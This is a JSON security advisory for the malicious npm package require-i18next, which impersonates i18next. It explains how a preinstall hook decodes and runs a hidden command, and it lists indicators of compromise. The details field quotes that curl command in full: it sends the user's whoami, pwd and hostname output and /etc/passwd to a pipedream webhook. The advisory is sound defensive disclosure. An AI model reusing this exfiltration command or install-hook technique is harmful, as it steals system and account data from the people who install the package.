@@ -1,0 +1,65 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11326",
+  "modified": "2026-08-15T13:11:01Z",
+  "published": "2026-08-15T13:10:42Z",
+  "summary": "Malicious code in require-i18next (npm)",
+  "details": "The preinstall hook (node preinstall.js) reads a hex-encoded command from a bundled preinstall.json, decodes it, and executes it with child_process.exec. The decoded command runs `curl hxxps://eobdzec83knbura[.]m[.]pipedream[.]net -d \"whoami=`whoami`\u0026pwd=`pwd`\u0026hostname=`hostname`\u0026passwd=`cat /etc/passwd`\"`, POSTing the host's username, working directory, hostname, and the contents of /etc/passwd to a remote pipedream[.]net webhook endpoint during installation. The package name impersonates the legitimate i18next library.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "require-i18next",
+        "purl": "pkg:npm/require-i18next"
+      },
+      "versions": [
+        "20.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/require-i18next/v/20.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11326"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-15T13:10:42Z",
+      "indicators_observed": {
+        "domain_observed": [
+          "eobdzec83knbura[.]m[.]pipedream[.]net",
+          "pipedream[.]net"
+        ],
+        "sha256": [
+          "290be58dc1308eac67a675797f43de7ee0c0b8604129853546cedd5b855b0ae5"
+        ],
+        "url_observed": [
+          "hxxps://eobdzec83knbura[.]m[.]pipedream[.]net"
+        ]
+      }
+    }
+  }
+}
